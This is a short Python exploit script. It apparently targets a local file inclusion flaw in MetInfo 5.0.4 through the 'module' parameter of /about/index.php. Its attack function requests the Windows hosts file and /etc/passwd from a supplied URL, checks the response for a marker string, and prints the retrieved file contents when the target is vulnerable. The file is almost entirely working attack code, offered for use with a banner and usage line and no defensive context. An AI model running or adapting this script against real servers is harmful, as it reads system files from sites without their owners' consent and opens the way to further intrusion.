#coding=utf-8

import requests
import sys


banner = """

  _____.__.__           .__              .__            .___     .__               
_/ ____\__|  |   ____   |__| ____   ____ |  |  __ __  __| _/_____|__| ____   ____  
\   __\|  |  | _/ __ \  |  |/    \_/ ___\|  | |  |  \/ __ |/  ___/  |/  _ \ /    \ 
 |  |  |  |  |_\  ___/  |  |   |  \  \___|  |_|  |  / /_/ |\___ \|  (  <_> )   |  \
 |__|  |__|____/\___  > |__|___|  /\___  >____/____/\____ /____  >__|\____/|___|  /
                    \/          \/     \/                \/    \/               \/ 

Authon : s
usage  : python3 *.py
"""

description = """
/about/index.php?fmodule=7&module=c:/windows/system32/drivers/etc/hosts
"""
headers = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0"
}

def attack(url):
    palyload = "/about/index.php?fmodule=7&module={}"

    full_url = url + palyload

    res = requests.get(url=full_url.format("c:/windows/system32/drivers/etc/hosts") , headers = headers)

    if "Additionally, comments" in res.text:
        print(f"\033[32m[+]The target {url} is vulnerable\033[0m")
        print(res.text)
        exit()
    
    res = requests.get(url=full_url.format("/etc/passwd") , headers = headers)
    if "Additionally, comments" in res.text:
        print(f"\033[32m[+]The target {url} is vulnerable\033[0m")
        print(res.text)
        exit()

    print(f"\033[31m[+]The target {url} is not vulnerable\033[40m")

if __name__ == "__main__":
    if len(sys.argv)<2:
        print(banner)
        exit()

    url = sys.argv[1]
    # url = "http://10.9.69.246/MetInfo5.0.4"

    attack(url)